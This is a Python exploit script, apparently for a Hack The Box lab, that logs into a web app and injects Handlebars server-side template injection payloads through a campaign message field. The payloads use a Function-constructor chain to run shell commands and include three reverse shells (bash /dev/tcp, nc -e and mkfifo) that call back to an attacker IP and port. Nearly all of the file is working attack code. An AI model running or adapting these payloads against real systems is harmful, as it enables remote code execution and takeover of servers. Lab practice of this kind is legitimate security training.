#!/usr/bin/env python3
"""Handlebars SSTI via campaign_message — probe + RCE attempts."""
import re
import time
import html as H
import http.cookiejar
import urllib.request
import urllib.parse
from pathlib import Path

LHOST = "10.10.14.36"
LPORT = "4444"
BASE = "http://dzcampaigns.htb"
EMAIL = "ania7295@htb.local"
PASS = "AniaWasd1!"
CHAR = 22
OUT = Path("/home/kali/Desktop/htb/dzcampaigns/loot/ssti-results.txt")


def js_exec(cmd: str) -> str:
    # single-quoted shell in execSync
    c = cmd.replace("\\", "\\\\").replace("'", "\\'")
    return (
        "return process.mainModule.require('child_process')"
        f".execSync('{c}').toString()"
    )


def classic(code: str) -> str:
    # Handlebars Function() RCE chain
    code_esc = code.replace("\\", "\\\\").replace('"', '\\"')
    return (
        '{{#with "s" as |string|}}'
        '{{#with "e"}}'
        "{{#with split as |conslist|}}"
        "{{this.pop}}"
        '{{this.push (lookup string.sub "constructor")}}'
        "{{this.pop}}"
        "{{#with string.split as |codelist|}}"
        "{{this.pop}}"
        f'{{{{this.push "{code_esc}"}}}}'
        "{{this.pop}}"
        "{{#each codelist}}"
        "{{#with (string.sub.apply 0 codelist)}}"
        "{{this}}"
        "{{/with}}"
        "{{/each}}"
        "{{/with}}"
        "{{/with}}"
        "{{/with}}"
        "{{/with}}"
    )


def classic_no_each(code: str) -> str:
    code_esc = code.replace("\\", "\\\\").replace('"', '\\"')
    return (
        '{{#with "s" as |string|}}'
        '{{#with "e"}}'
        "{{#with split as |conslist|}}"
        "{{this.pop}}"
        '{{this.push (lookup string.sub "constructor")}}'
        "{{this.pop}}"
        "{{#with string.split as |codelist|}}"
        "{{this.pop}}"
        f'{{{{this.push "{code_esc}"}}}}'
        "{{this.pop}}"
        "{{#with (string.sub.apply 0 codelist)}}"
        "{{this}}"
        "{{/with}}"
        "{{/with}}"
        "{{/with}}"
        "{{/with}}"
        "{{/with}}"
    )


REV_BASH = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
REV_NC = f"nc -e /bin/bash {LHOST} {LPORT}"
REV_MKFIFO = (
    f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
)

PAYLOADS = [
    ("probe_if", "{{#if true}}PROBE_OK{{/if}}"),
    ("dump_sub_ctor", '{{#with "s" as |string|}}{{lookup string.sub "constructor"}}{{/with}}'),
    ("dump_str_ctor", '{{#with "s" as |string|}}{{lookup string "constructor"}}{{/with}}'),
    ("block_params_ctor", '{{#with "s" as |string|}}{{string.sub.constructor}}{{/with}}'),
    (
        "with_ctor_block",
        '{{#with "s" as |string|}}{{#with string.sub.constructor as |c|}}CT={{c}}{{/with}}{{/with}}',
    ),
    (
        "func_lookup_id",
        '{{#with "s" as |string|}}'
        '{{#with (lookup string.sub "constructor") as |F|}}'
        f'{{{{#with (F "{js_exec("id")}") as |fn|}}}}'
        "{{fn}}"
        "{{/with}}{{/with}}{{/with}}",
    ),
    ("classic_id", classic(js_exec("id"))),
    ("classic_id_plain", classic("return process.mainModule.require('child_process').execSync('id').toString()")),
    ("classic_uname", classic(js_exec("uname -a"))),
    ("classic_no_each_id", classic_no_each(js_exec("id"))),
    ("classic_rev", classic(js_exec(REV_BASH))),
    ("classic_rev_nc", classic(js_exec(REV_NC))),
    ("classic_rev_fifo", classic(js_exec(REV_MKFIFO))),
    # alternative code styles
    (
        "classic_require_id",
        classic("return require('child_process').execSync('id').toString()"),
    ),
    (
        "classic_global_id",
        classic(
            "return global.process.mainModule.require('child_process').execSync('id').toString()"
        ),
    ),
]


def main():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    def G(u):
        return op.open(u, timeout=30).read().decode("utf-8", "replace")

    def P(u, d):
        req = urllib.request.Request(
            u, data=urllib.parse.urlencode(d).encode(), method="POST"
        )
        try:
            r = op.open(req, timeout=30)
            return r.status, r.geturl(), r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, "", e.read().decode("utf-8", "replace")

    def login():
        lg = G(f"{BASE}/login")
        csrf = re.search(r'name="_csrf" value="([^"]+)"', lg).group(1)
        st, _, _ = P(
            f"{BASE}/login",
            {"_csrf": csrf, "email": EMAIL, "password": PASS},
        )
        print("login", st)

    def edit_msg(msg: str):
        ed = G(f"{BASE}/character/{CHAR}/edit")
        m = re.search(r'name="_csrf" value="([^"]+)"', ed)
        if not m:
            login()
            ed = G(f"{BASE}/character/{CHAR}/edit")
            m = re.search(r'name="_csrf" value="([^"]+)"', ed)
        csrf = m.group(1)
        return P(
            f"{BASE}/character/{CHAR}",
            {
                "_csrf": csrf,
                "name": "AniaHero",
                "race": "Tiefling",
                "class": "Warlock",
                "backstory": "x",
                "campaign_message": msg,
            },
        )

    def last_msg():
        camp = G(f"{BASE}/campaign/1")
        msgs = re.findall(r'<div class="message">\s*<p>(.*?)</p>', camp, re.S)
        if not msgs:
            return ""
        return H.unescape(re.sub(r"\s+", " ", msgs[-1]))

    login()
    lines = []
    for name, msg in PAYLOADS:
        try:
            st, url, body = edit_msg(msg)
            last = last_msg()
            keys = (
                "uid=",
                "gid=",
                "PROBE",
                "function",
                "Function",
                "Linux",
                "www-data",
                "root",
                "node",
                "CT=",
            )
            flag = "*" if any(k in last for k in keys) or st >= 400 else " "
            print(f"{st:3} {flag} {name:22} | {last[:180]!r}")
            lines.append(f"{name}\t{st}\t{last[:400]}")
        except Exception as e:
            print(f"ERR {name}: {e}")
            lines.append(f"{name}\tERR\t{e}")
        time.sleep(0.25)

    OUT.write_text("\n".join(lines) + "\n")
    print("wrote", OUT)


if __name__ == "__main__":
    main()
